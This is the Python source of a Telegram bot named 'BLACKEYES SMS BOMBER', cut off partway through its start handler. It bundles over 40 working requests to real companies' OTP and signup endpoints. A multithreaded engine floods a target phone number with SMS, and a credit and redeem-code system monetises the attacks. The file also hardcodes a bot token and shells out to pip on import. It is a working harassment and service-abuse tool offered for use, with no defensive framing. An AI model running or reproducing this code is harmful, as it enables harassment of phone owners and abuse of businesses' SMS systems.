#!/use/bin/env python3
# ==============================================
# 🐉 BLACKEYES SMS BOMBER - TELEGRAM BOT v6.0
# With Credit System, Inline Buttons, Force Join
# ==============================================
# Developer: BLACKEYES🐉
# Version: 6.0 COMPLETE
# ==============================================

import os
import sys
import time
import random
import threading
import json
import base64
import datetime
import logging
import asyncio
import requests
import string
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs

# Telegram imports
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, ChatMember
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, CallbackContext
except ImportError:
    os.system("pip install python-telegram-bot requests")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, ChatMember
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, CallbackContext

# ==============================================
# ⚙️ CONFIGURATION
# ==============================================
BOT_TOKEN = "8879549452:AAHhBg28142bb20uCwJdJPti8RJES-jHmnI"
OWNER_ID = 8785590284
ADMIN_IDS = [OWNER_ID, 8785590284]
FORCE_JOIN_CHANNEL = "@jaatescrowservice"
ALLOWED_GROUPS = []

# ==============================================
# 📁 FILES
# ==============================================
PROTECTED_FILE = "blackeyes_protected.json"
CONFIG_FILE = "blackeyes_config.json"
ATTACK_LOG = "blackeyes_attacks.log"
USER_DATA_FILE = "user_data.json"
REDEEM_CODES_FILE = "redeem_codes.json"
BOT_STATUS_FILE = "bot_status.json"

# ==============================================
# ⚙️ DEFAULT CONFIG
# ==============================================
DEFAULT_CONFIG = {
    "country_code": "91",
    "delay": 0.3,
    "threads": 15,
    "max_requests": 1000,
    "auto_retry": True,
    "mode": "balanced",
    "default_credits": 100,
    "credit_per_request": 1,
    "is_bot_on": True
}

# ==============================================
# 📝 LOGGING
# ==============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==============================================
# 💾 BOT STATUS MANAGEMENT
# ==============================================

def load_bot_status():
    if not os.path.exists(BOT_STATUS_FILE):
        return {"is_on": True}
    try:
        with open(BOT_STATUS_FILE, "r") as f:
            return json.load(f)
    except:
        return {"is_on": True}

def save_bot_status(data):
    with open(BOT_STATUS_FILE, "w") as f:
        json.dump(data, f, indent=4)

def is_bot_on():
    return load_bot_status().get("is_on", True)

def set_bot_status(status):
    data = load_bot_status()
    data["is_on"] = status
    save_bot_status(data)

# ==============================================
# 💥 ALL APIS (45+ Working APIs)
# ==============================================

class APIManager:
    @staticmethod
    def send_oyo(phone, cc):
        try:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_flipkart(phone, cc):
        try:
            url = "https://www.flipkart.com/api/6/user/signup/status"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"loginId": [f"+{cc}{phone}"], "supportAllStates": True}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pharmeasy(phone, cc):
        try:
            url = "https://pharmeasy.in/api/auth/requestOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactNumber": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_practo(phone, cc):
        try:
            url = "https://accounts.practo.com/send_otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{phone}'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "success" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_goibibo(phone, cc):
        try:
            url = "https://www.goibibo.com/common/downloadsms/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mbl': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pizzahut(phone, cc):
        try:
            url = "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"customer": {"MobileNo": phone, "UserName": phone, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_altbalaji(phone, cc):
        try:
            url = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_code": cc, "phone_number": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_ajio(phone, cc):
        try:
            url = "https://www.ajio.com/api/auth/signupSendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"firstName": "User", "login": "user@gmail.com", "password": "Pass@123", "mobileNumber": phone, "requestType": "SENDOTP"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return '"statusCode":"1"' in r.text or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_lenskart(phone, cc):
        try:
            url = "https://www.ref-r.com/clients/lenskart/smsApi"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone, 'submit': '1'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_apollo(phone, cc):
        try:
            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "sent" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_grab(phone, cc):
        try:
            url = "https://api.grab.com/grabid/v1/phone/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{phone}', 'templateID': 'pax_android_production'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_gokwik(phone, cc):
        try:
            url = "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'gk-merchant-id': '19g6im8srkz9y'}
            data = {"phone": phone, "country": "IN"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_khatabook(phone, cc):
        try:
            url = "https://api.khatabook.com/v1/auth/request-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'x-kb-platform': 'web'}
            data = {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_udaan(phone, cc):
        try:
            url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_penpencil(phone, cc):
        try:
            url = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_vidyakul(phone, cc):
        try:
            url = "https://vidyakul.com/signup-otp/send"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'phone': phone, 'rcsconsent': 'true'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_jockey(phone, cc):
        try:
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{phone}?whatsapp=true"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pinknblu(phone, cc):
        try:
            url = "https://pinknblu.com/v1/auth/generate/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 'country_code': f'+{cc}', 'phone': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_breeze(phone, cc):
        try:
            url = "https://api.breeze.in/session/start"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phoneNumber": phone, "authVerificationType": "otp", "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_heromoto(phone, cc):
        try:
            url = "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile_no': phone, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis='}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_indialends(phone, cc):
        try:
            url = "https://indialends.com/internal/a/mobile-verification_v2.ashx"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': phone, 'lj80gertdfg': '0'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_delhivery(phone, cc):
        try:
            url = f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_confirmtkt(phone, cc):
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_nuvama(phone, cc):
        try:
            url = "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactInfo": phone, "mode": "SMS"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_aditya(phone, cc):
        try:
            url = "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_kisan(phone, cc):
        try:
            url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile_number": phone, "client_id": "kisan-app"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_swiggy(phone, cc):
        try:
            url = "https://www.swiggy.com/mapi/auth/signup"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"name": "User", "email": "user@gmail.com", "password": "Pass@123", "mobile": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_zomato(phone, cc):
        try:
            url = "https://www.zomato.com/webroutes/auth/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bigbasket(phone, cc):
        try:
            url = "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"identifier": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bookmyshow(phone, cc):
        try:
            url = "https://in.bookmyshow.com/pwa/api/uapi/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_dream11(phone, cc):
        try:
            url = "https://www.dream11.com/graphql/mutation/pwa/register"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"query": "mutation register($email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation(email: $email mobileNumber: $mobileNumber password: $password site: $site) { message }}", "variables": {"email": "user@gmail.com", "mobileNumber": phone, "password": "Pass@123"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sonyliv(phone, cc):
        try:
            url = "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobileNumber": phone, "channelPartnerID": "MSMIND", "country": "IN", "timestamp": datetime.datetime.now().isoformat()}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_hotstar(phone, cc):
        try:
            url = "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phone_number": phone, "country_prefix": cc}
            r = requests.put(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_voot(phone, cc):
        try:
            url = "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"type": "mobile", "mobile": phone, "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bikroy(phone, cc):
        try:
            url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'application-name': 'web'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_garibook(phone, cc):
        try:
            url = "https://api.garibookadmin.com/api/v3/user/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "recaptcha_token": "garibookcaptcha", "channel": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sheba(phone, cc):
        try:
            url = "https://accountkit.sheba.xyz/api/shooot-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "app_id": "8329815A6D1AE6DD"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_applink(phone, cc):
        try:
            url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"msisdn": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_arogga(phone, cc):
        try:
            url = "https://api.arogga.com/auth/v1/sms/send/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone, 'fcmToken': '', 'referral': ''}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_osudpotro(phone, cc):
        try:
            url = "https://api.osudpotro.com/api/v1/users/send_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "deviceToken": "web", "language": "en", "os": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_medeasy(phone, cc):
        try:
            url = f"https://api.medeasy.health/api/send-otp/+{cc}{phone}/"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_carebox(phone, cc):
        try:
            url = "https://www.api-care-box.click/api/user/register/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"Name": "User", "Phone": f"+{cc}{phone}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False

# ==============================================
# 📋 COMPLETE API LIST
# ==============================================
ALL_APIS = [
    {"name": "OYO Rooms", "func": APIManager.send_oyo},
    {"name": "Flipkart", "func": APIManager.send_flipkart},
    {"name": "PharmEasy", "func": APIManager.send_pharmeasy},
    {"name": "Practo", "func": APIManager.send_practo},
    {"name": "GoIbibo", "func": APIManager.send_goibibo},
    {"name": "PizzaHut", "func": APIManager.send_pizzahut},
    {"name": "AltBalaji", "func": APIManager.send_altbalaji},
    {"name": "Ajio", "func": APIManager.send_ajio},
    {"name": "Lenskart", "func": APIManager.send_lenskart},
    {"name": "Apollo", "func": APIManager.send_apollo},
    {"name": "Grab", "func": APIManager.send_grab},
    {"name": "GoKwik", "func": APIManager.send_gokwik},
    {"name": "Khatabook", "func": APIManager.send_khatabook},
    {"name": "Udaan", "func": APIManager.send_udaan},
    {"name": "PenPencil", "func": APIManager.send_penpencil},
    {"name": "Vidyakul", "func": APIManager.send_vidyakul},
    {"name": "Jockey", "func": APIManager.send_jockey},
    {"name": "Pinknblu", "func": APIManager.send_pinknblu},
    {"name": "Breeze", "func": APIManager.send_breeze},
    {"name": "HeroMoto", "func": APIManager.send_heromoto},
    {"name": "IndiaLends", "func": APIManager.send_indialends},
    {"name": "Delhivery", "func": APIManager.send_delhivery},
    {"name": "ConfirmTkt", "func": APIManager.send_confirmtkt},
    {"name": "Nuvama", "func": APIManager.send_nuvama},
    {"name": "AdityaBirla", "func": APIManager.send_aditya},
    {"name": "Kisan", "func": APIManager.send_kisan},
    {"name": "Swiggy", "func": APIManager.send_swiggy},
    {"name": "Zomato", "func": APIManager.send_zomato},
    {"name": "BigBasket", "func": APIManager.send_bigbasket},
    {"name": "BookMyShow", "func": APIManager.send_bookmyshow},
    {"name": "Dream11", "func": APIManager.send_dream11},
    {"name": "SonyLiv", "func": APIManager.send_sonyliv},
    {"name": "Hotstar", "func": APIManager.send_hotstar},
    {"name": "Voot", "func": APIManager.send_voot},
    {"name": "Bikroy", "func": APIManager.send_bikroy},
    {"name": "Garibook", "func": APIManager.send_garibook},
    {"name": "Sheba", "func": APIManager.send_sheba},
    {"name": "AppLink", "func": APIManager.send_applink},
    {"name": "Arogga", "func": APIManager.send_arogga},
    {"name": "Osudpotro", "func": APIManager.send_osudpotro},
    {"name": "MedEasy", "func": APIManager.send_medeasy},
    {"name": "CareBox", "func": APIManager.send_carebox},
]

# ==============================================
# 💾 DATA MANAGEMENT
# ==============================================

def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return {}
    try:
        with open(PROTECTED_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_protected(data):
    with open(PROTECTED_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def is_protected(phone):
    data = load_protected()
    return phone in data

def protect_number(phone, name="Protected"):
    data = load_protected()
    data[phone] = {
        "phone": phone,
        "name": name,
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_protected(data)
    return True

def remove_protected(phone):
    data = load_protected()
    if phone in data:
        del data[phone]
        save_protected(data)
        return True
    return False

# ==============================================
# 👤 USER DATA MANAGEMENT
# ==============================================

def load_user_data():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    try:
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_user_data(data):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_user(user_id):
    data = load_user_data()
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {
            "credits": load_config().get("default_credits", 100),
            "total_attacks": 0,
            "join_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": None,
            "first_name": None,
            "last_name": None
        }
        save_user_data(data)
    return data[user_id]

def add_credits(user_id, amount):
    data = load_user_data()
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {"credits": 0}
    data[user_id]["credits"] = data[user_id].get("credits", 0) + amount
    save_user_data(data)
    return data[user_id]["credits"]

def deduct_credits(user_id, amount):
    data = load_user_data()
    user_id = str(user_id)
    if user_id not in data:
        return False, 0
    if data[user_id].get("credits", 0) >= amount:
        data[user_id]["credits"] = data[user_id].get("credits", 0) - amount
        save_user_data(data)
        return True, data[user_id]["credits"]
    return False, data[user_id].get("credits", 0)

def get_user_credits(user_id):
    data = load_user_data()
    user_id = str(user_id)
    return data.get(user_id, {}).get("credits", 0)

def update_user_attack(user_id):
    data = load_user_data()
    user_id = str(user_id)
    if user_id in data:
        data[user_id]["total_attacks"] = data[user_id].get("total_attacks", 0) + 1
        save_user_data(data)

# ==============================================
# 🎫 REDEEM CODES MANAGEMENT
# ==============================================

def load_redeem_codes():
    if not os.path.exists(REDEEM_CODES_FILE):
        return {}
    try:
        with open(REDEEM_CODES_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_redeem_codes(data):
    with open(REDEEM_CODES_FILE, "w") as f:
        json.dump(data, f, indent=4)

def generate_redeem_code(quantity, credits, created_by):
    codes = load_redeem_codes()
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    codes[code] = {
        "quantity": quantity,
        "credits": credits,
        "created_by": str(created_by),
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "used_by": [],
        "used_count": 0,
        "is_active": True
    }
    save_redeem_codes(codes)
    return code

def redeem_code(code, user_id):
    codes = load_redeem_codes()
    if code not in codes:
        return False, "❌ Invalid redeem code!"
    
    code_data = codes[code]
    if not code_data.get("is_active", True):
        return False, "❌ Code has been deactivated!"
    
    if code_data.get("used_count", 0) >= code_data.get("quantity", 1):
        return False, "❌ Code usage limit reached!"
    
    # Add credits
    credits = code_data.get("credits", 0)
    add_credits(user_id, credits)
    
    # Update code usage
    code_data["used_count"] = code_data.get("used_count", 0) + 1
    code_data["used_by"].append(str(user_id))
    if code_data["used_count"] >= code_data.get("quantity", 1):
        code_data["is_active"] = False
    
    save_redeem_codes(codes)
    return True, f"✅ Redeemed {credits} credits successfully! You now have {get_user_credits(user_id)} credits."

# ==============================================
# 💣 BOMBING ENGINE
# ==============================================

class BombingEngine:
    def __init__(self):
        self.active = {}
        self.counts = {}
        self.success = {}
        self.failed = {}
        self.lock = threading.Lock()
        self.config = load_config()
        
    def clean_phone(self, phone):
        phone = ''.join(filter(str.isdigit, phone))
        if phone.startswith('91') and len(phone) > 10:
            phone = phone[2:]
        if phone.startswith('0'):
            phone = phone[1:]
        return phone
    
    def start_attack(self, phone, user_id, max_requests=None, threads=None):
        phone = self.clean_phone(phone)
        if not phone or len(phone) != 10:
            return False, "Invalid phone number"
        
        if is_protected(phone):
            return False, "Number is protected!"
        
        # Check credits
        credits_needed = max_requests if max_requests else self.config.get("max_requests", 1000)
        if get_user_credits(user_id) < credits_needed:
            return False, f"Insufficient credits! Need {credits_needed}, you have {get_user_credits(user_id)}"
        
        if phone in self.active and self.active[phone]:
            return False, "Attack already running!"
        
        # Deduct credits
        success, _ = deduct_credits(user_id, credits_needed)
        if not success:
            return False, "Failed to deduct credits!"
        
        if max_requests is None:
            max_requests = self.config.get("max_requests", 1000)
        if threads is None:
            threads = self.config.get("threads", 15)
        
        self.active[phone] = True
        self.counts[phone] = 0
        self.success[phone] = 0
        self.failed[phone] = 0
        
        # Start threads
        for i in range(threads):
            threading.Thread(target=self._worker, args=(phone, max_requests), daemon=True).start()
        
        update_user_attack(user_id)
        return True, f"Attack started with {threads} threads! Credits deducted: {credits_needed}"
    
    def _worker(self, phone, max_requests):
        cc = load_config().get("country_code", "91")
        delay = load_config().get("delay", 0.3)
        api_list = ALL_APIS.copy()
        random.shuffle(api_list)
        
        while self.active.get(phone, False) and self.counts.get(phone, 0) < max_requests:
            if not api_list:
                api_list = ALL_APIS.copy()
                random.shuffle(api_list)
            
            api = random.choice(api_list)
            
            try:
                success = api["func"](phone, cc)
                with self.lock:
                    self.counts[phone] = self.counts.get(phone, 0) + 1
                    if success:
                        self.success[phone] = self.success.get(phone, 0) + 1
                    else:
                        self.failed[phone] = self.failed.get(phone, 0) + 1
                
                if not success and len(api_list) > 1:
                    api_list.remove(api)
                    
            except Exception as e:
                with self.lock:
                    self.counts[phone] = self.counts.get(phone, 0) + 1
                    self.failed[phone] = self.failed.get(phone, 0) + 1
                if len(api_list) > 1:
                    api_list.remove(api)
            
            time.sleep(delay)
    
    def stop_attack(self, phone):
        phone = self.clean_phone(phone)
        if phone in self.active:
            self.active[phone] = False
            time.sleep(1)
            return True, f"Attack stopped! Total: {self.counts.get(phone, 0)} requests"
        return False, "No active attack!"
    
    def get_status(self, phone):
        phone = self.clean_phone(phone)
        if phone in self.active:
            count = self.counts.get(phone, 0)
            success = self.success.get(phone, 0)
            failed = self.failed.get(phone, 0)
            max_req = load_config().get("max_requests", 1000)
            progress = (count / max_req) * 100 if max_req > 0 else 0
            return {
                "active": self.active[phone],
                "count": count,
                "success": success,
                "failed": failed,
                "max": max_req,
                "progress": min(progress, 100)
            }
        return None

# ==============================================
# 🔍 FORCE JOIN CHECK
# ==============================================

async def check_force_join(user_id, context):
    try:
        chat = await context.bot.get_chat(FORCE_JOIN_CHANNEL)
        member = await context.bot.get_chat_member(chat.id, user_id)
        if member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
            return True
        return False
    except:
        return False

# ==============================================
# 🤖 BOT HANDLERS
# ==============================================

engine = BombingEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check force join
    if not await check_force_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ You must join our channel to use this bot!\n\n"
            f"📢 Channel: {FORCE_JOIN_CHANNEL}\n\n"
            f"Click the button below to join, then /start again.",
            reply_markup=reply_markup
        )
        return
    
    # Get user data
    user = get_user(user_id)
    credits = user.get("credits", 0)
    
    keyboard = [
        [InlineKeyboardButton("💣 Bomb Now", callback_data="bomb")],
        [InlineKeyboardButton("📊 My Status", callback_data="status")],
        [InlineKeyboardButton("🎫 Redeem Code", callback_data="redeem")],
        [InlineKeyboardButton("📘 Protected Numbers", callback_data="protected")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🐉 **BLACKEYES SMS BOMBER**\n\n"
        f"👋 Welcome {update.effective_user.first_name}!\n"
        f"💰 **Credits**: `{credits}`\n"
        f"📊 **Total Attacks**: `{user.get('total_attacks', 0)}`\n"
        f"📡 **APIs Loaded**: `{len(ALL_APIS)}`\n"
